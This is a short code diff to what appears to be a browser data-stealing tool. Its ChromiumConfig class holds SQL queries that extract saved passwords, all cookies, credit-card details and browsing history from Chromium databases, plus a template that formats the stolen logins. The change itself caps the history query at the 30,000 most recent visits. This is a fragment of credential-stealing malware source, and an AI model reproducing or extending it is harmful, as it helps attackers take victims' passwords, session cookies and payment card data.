@@ -16,7 +16,7 @@ class ChromiumConfig:
     PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
     CookiesSQL = "SELECT * FROM cookies"
     CardsSQL = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
-    HistorySQL = "SELECT url FROM visits"
+    HistorySQL = "SELECT url FROM visits ORDER BY visit_time DESC LIMIT 30000"
     HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
 
     PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
